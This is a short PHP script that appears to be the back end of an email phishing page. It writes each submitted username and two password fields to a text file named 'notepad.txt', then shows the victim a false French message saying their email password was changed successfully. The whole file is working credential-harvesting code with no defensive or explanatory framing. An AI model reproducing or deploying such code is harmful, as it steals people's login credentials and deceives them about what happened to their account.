<?php

if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['pass'])) 
{
$data = $_POST['username'].' - '.$_POST['password'].' - '.$_POST['pass']."\r\n";

$ret = file_put_contents('notepad.txt',$data,FILE_APPEND | LOCK_EX);

if($ret === false){
   die('There was an error');
}
else {
   
echo "<center><b><h2><br><br>LE MOT DE PASSE DE VOTRE COMPTE DE COURRIEL A ÉTÉ MODIFIÉ AVEC SUCCÈS ET PRÊT À ÊTRE UTILISÉ DANS LES PROCHAINES 48 HEURES. <br><br>UNE NOTIFICATION DE VOTRE NOUVEAU MOT DE PASSE SERA ENVOYÉE À VOTRE BOÎTE DE RÉCEPTION/NUMÉRO DE TÉLÉPHONE. <br><br> VEUILLEZ NE PAS RENVOYER LE MESSAGE .";
}
}
?>